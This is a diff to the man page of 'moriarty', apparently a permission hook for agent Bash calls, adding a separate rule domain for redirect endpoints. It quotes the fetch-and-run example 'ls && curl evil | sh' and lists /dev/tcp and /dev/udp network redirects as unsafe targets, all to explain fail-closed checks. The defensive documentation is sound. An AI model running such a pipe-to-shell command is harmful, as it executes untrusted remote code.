@@ -17,11 +17,14 @@ and are evaluated only when no tool rule
 .Pq see Xr moriarty\-tool\-rules 5
 has matched the Bash tool call.
 .Pp
-Rules are evaluated top\-to\-bottom with
+Rules are evaluated top\-to\-bottom among rules eligible for the current permission mode.
+Ordinary command actions and
+.Cm AllowRedirect
+actions form independent
 .Em first\-match\-wins
-semantics among rules eligible for the current permission mode.
+domains, so a rule in one domain cannot authorize or shadow the other.
 An ineligible matching rule is skipped without changing its declared position.
-Place more specific rules before general ones.
+Place more specific rules before general rules in the same domain.
 .Sh COMPOUND COMMANDS
 Before matching, the hook parses each Bash command with a real shell parser and evaluates every
 leaf simple\-command of a compound command independently, then merges the per\-leaf decisions.
@@ -36,8 +39,13 @@ matches the
 .Ql ls
 leaf of
 .Ql ls | wc -l .
-Redirect syntax remains in each leaf's match text; redirect targets are also
-inspected separately so real file writes can cap Allow at Ask.
+Redirect syntax remains in each leaf's command match text for compatibility.
+A redirect-only leaf such as
+.Ql > out
+therefore needs an ordinary command rule matching that full text plus a redirect rule authorizing
+.Ql out ;
+a rule for the bare target is not enough.
+Each output endpoint is also normalized and authorized independently by the redirect rule domain.
 .It
 Merge precedence: any denied leaf denies the whole command; otherwise any leaf that asks, or that
 matches no rule, prompts; only an all\-allowed command is allowed.
@@ -45,9 +53,22 @@ A dangerous tail can no longer hide behind a safe head \(em
 .Ql ls && curl evil | sh
 prompts and is never auto\-allowed.
 .It
-A leaf that redirects to a real file
-.Pq not /dev/null, and not an fd duplication such as 2>&1
-has any Allow capped at Ask.
+A leaf is auto\-allowed only when an ordinary
+.Cm Allow
+rule matches the command and every output endpoint matches an eligible
+.Cm AllowRedirect
+rule.
+This includes writes, appends, clobbers, read/write redirects, combined stdout/stderr redirects,
+.Pa /dev/null
+and other device paths, and descriptor duplication or closure such as
+.Ql 2>&1
+and
+.Ql >&- .
+A descriptor\-duplication target other than digits or
+.Ql -
+.Pq for example, Ql 2>&foo
+is unresolvable and prompts.
+Input\-only redirects remain outside this endpoint policy.
 .It
 A command containing command substitution
 .Pq Ql $(...) ,
@@ -74,6 +95,93 @@ An operand equal to the cwd becomes
 .Ql .
 rather than disappearing.
 .El
+.Ss Redirect Endpoint Authorization
+Filesystem endpoints are canonicalized before redirect rules match.
+Existing symlinks are resolved; for a missing target, the deepest existing directory is
+canonicalized and the missing suffix is rebuilt without permitting
+.Ql ..
+to escape that ancestor.
+Broken symlinks, non\-directory ancestors, races that prevent stable resolution, dynamic variables,
+globs (including extglobs such as
+.Ql @(one|two) ) ,
+braces, and other non\-static targets prompt rather than auto\-allow.
+Unsafe virtual paths under
+.Pa /proc/self , /proc/thread-self , /dev/fd , /dev/std* , /dev/tcp ,
+or
+.Pa /dev/udp ,
+including targets reached through symlink chains, also prompt because the hook cannot resolve them as the later Bash process or safely model Bash network redirects.
+Filesystem checks reduce but cannot eliminate the time\-of\-check/time\-of\-use race between
+hook evaluation and shell execution.
+Live Bash evaluation runs under one two\-second deadline covering parsing, matching, path resolution,
+Modify checks, and ArgumentFilter rechecks.
+A timeout or blocking\-task failure prompts without a deciding rule or contributors.
+Offline test, replay, explain, and suggestion evaluation has no deadline.
+.Pp
+The redirect pattern sees a deterministic endpoint: a path below canonical cwd is cwd\-relative
+.Pq Ql . No for cwd itself ,
+a path below the resolved home is
+.Ql ~/... ,
+and another path remains canonical absolute.
+Devices and special files always use canonical absolute form, so
+.Ql /dev/null
+is independent of cwd.
+A cwd\-relative filename beginning with
+.Ql ~
+or
+.Ql &
+receives a
+.Ql ./
+prefix; the ordinary file
+.Ql ./&1
+therefore cannot collide with the descriptor token
+.Ql &1 .
+A resolved path that is not valid UTF\-8 prompts rather than being rendered lossily.
+Descriptor duplication and closure use tokens such as
+.Ql &1 , &2 ,
+and
+.Ql &- .
+Only an unquoted plain current-user
+.Ql ~
+is expanded through home.
+A quoted or escaped tilde remains a cwd-relative literal and is rendered as
+.Ql ./~/... ,
+so it cannot collide with the home-relative form.
+An invalid or unavailable
+.Ev HOME
+prevents plain tilde expansion but does not block unrelated local, absolute, device, or descriptor targets.
+An ordinary
+.Ql $HOME
+is dynamic.
+.Cm HOME
+cannot be configured as a path alias because it controls tilde expansion.
+A relative or home-relative filesystem redirect in a path-context barrier command, or any later command, prompts because
+changed shell path context is not modeled.
+Assignments, dynamic command names,
+.Cm cd , pushd , popd ,
+and recognized shell-state builtins, including
+.Cm shopt , alias , unalias ,
+are barriers; absolute paths and descriptor redirects remain independently evaluable.
+For the same reason,
+.Ql moriarty rules suggest --action allow-redirect
+omits any leaf containing a context-dependent endpoint and any leaf blocked by command policy.
+Leaves whose endpoints are all absolute or descriptors remain eligible.
+Local suggestions match cwd-relative names in every project; they are not scoped to the repository where they were mined.
+Historical logs do not record HOME, so replay and suggestion mining resolve tilde targets against the current process
+HOME and live filesystem.
+A rule with
+.Ic allow_local = true
+matches only ordinary or not\-yet\-created filesystem targets resolved below canonical cwd.
+It cannot authorize devices, special files, or descriptor tokens; those require an unrestricted,
+target\-specific
+.Cm AllowRedirect
+rule.
+.Pp
+All endpoints must match independently and in source order.
+A missing match caps an otherwise allowed command at Ask.
+.Cm Modify
+output and
+.Cm ArgumentFilter
+revalidation are subject to the same endpoint policy.
 .Pp
 Allow\-rules can therefore be simple prefixes without enumerating pipes, operators, or
 shell\-metacharacter exclusions.
@@ -187,16 +295,18 @@ confirmation.
 The same conservative barrier applies to
 .Cm command , builtin , exec , eval , source , . , trap , let , unset ,
 .Cm export , readonly , declare , typeset , local , read , mapfile ,
-.Cm readarray , getopts ,
+.Cm readarray , getopts , printf , shopt , alias ,
 and
-.Cm printf .
+.Cm unalias .
 This may prompt for a harmless form, but later references cannot use stale
 bindings and no per\-builtin option semantics are required.
 .Pp
-Redirect targets are classified after known expansion, so an exact expanded
+Redirect targets are classified after known expansion.
+Every output endpoint still requires a separate
+.Cm AllowRedirect
+rule; expanded
 .Pa /dev/null
-keeps the discard exemption; other writable targets keep the real\-file
-Allow\-to\-Ask cap.
+and descriptor endpoints have no exemption.
 An expansion in command position requires confirmation, while
 .Cm exec
 and wrapper barriers prevent an alias from auto\-authorizing a derived
@@ -204,10 +314,12 @@ executable.
 .Pp
 .Cm moriarty test bash\-rules Fl \-cwd Ar dir Fl \-explain Ar command
 shows consumed bindings, original source, alias\-expanded text,
-cwd\-normalized match text, confirmation reasons, matching rules, and the
-final decision.
-Normal test execution uses the same compound and alias analysis as explain
-mode and the live hook.
+cwd\-normalized command text, endpoint match text and locality, resolution or authorization
+failures, unanalyzable Modify rewrites, matching rules, ordered contributors, and the final decision.
+Normal test execution, explain mode, and replay use the same completed analysis and one\-pass
+.Cm ArgumentFilter
+revalidation as the live hook.
+Suggestions consume the same canonical original policy analysis without computing unused continuations.
 .Sh CONFIGURATION
 .Ss File Location
 .Pa ~/.config/moriarty/tool_rules.toml
@@ -269,6 +381,26 @@ name = "allow\-git\-status"
 pattern = "^git\e\es+status"
 action = { type = "Allow" }
 .Ed
+.Ss AllowRedirect
+Authorize one normalized output endpoint without granting command execution.
+Redirect rules are evaluated only in the separate endpoint domain.
+.Bd -literal -offset indent
+[[bash_rules]]
+name = "allow\-project\-build\-redirects"
+pattern = "^build/"
+action = { type = "AllowRedirect", allow_local = true }
+
+[[bash_rules]]
+name = "allow\-stdout\-descriptor"
+pattern = "^&1$"
+action = { type = "AllowRedirect" }
+.Ed
+.Pp
+Omitting
+.Ic allow_local
+is equivalent to false and permits the pattern to match non\-local filesystem paths, devices, and
+descriptor tokens.
+Such rules should use narrowly anchored patterns.
 .Ss Deny
 Block the command and show an error message to the user.
 .Bd -literal -offset indent
@@ -286,6 +418,10 @@ name = "add\-dry\-run"
 pattern = "^(docker\e\es+system\e\es+prune)"
 action = { type = "Modify", value = "$1 \-\-dry\-run" }
 .Ed
+.Pp
+A rewritten command the splitter cannot analyze prompts even when no output redirect is apparent,
+because Moriarty cannot prove that the rewrite opens no endpoint.
+Alias or shell-state uncertainty in a rewritten leaf has the same fail-closed result.
 .Pp
 .Sy Security Warning :
 Modify actions use unescaped capture group replacement.
@@ -309,17 +445,25 @@ Structurally remove, add, or replace command arguments before execution.
 Unlike
 .Cm Modify ,
 .Cm ArgumentFilter
-manipulates arguments as discrete tokens,
+uses the brush parse's discrete arguments and source spans,
 making it easier to handle flags regardless of their position.
+Unchanged quoting, expansions, redirect operators, leading
+.Cm time , time -p ,
+and
+.Cm !
+pipeline prefixes, and a trailing background
+.Cm &
+remain intact; replacement and added values are shell-quoted.
+Redirect endpoint policy therefore still applies after filtering.
 .Pp
 .Sy Important :
 After filtering, the modified command is automatically re\-validated
 against all rules.
-The filtered command must match an
+The filtered command must match an ordinary
 .Cm Allow
-rule (or be manually approved via
-.Cm Ask )
-to execute.
+rule and every output endpoint must match
+.Cm AllowRedirect
+.Pq or the command is manually approved via Cm Ask .
 Chained ArgumentFilter rules are prevented to avoid infinite loops.
 .Pp
 .Em Removing arguments :
@@ -514,9 +658,11 @@ Remember to escape
 .Ql \e\e , ( , ) , [ , ] , { , } , \&. , * , + , ? , |
 in patterns.
 .It
-.Em Order rules from specific to general.
-Deny rules for dangerous commands should come before
-broader allow rules.
+.Em Order rules from specific to general within each domain.
+Deny rules for dangerous commands should come before broader command allow rules.
+Keep unrestricted redirect patterns target\-specific; use
+.Ic allow_local = true
+for intentional project\-wide output policy.
 .It
 .Em Use fragments for security patterns.
 Define injection\-safe character classes once and reuse them.
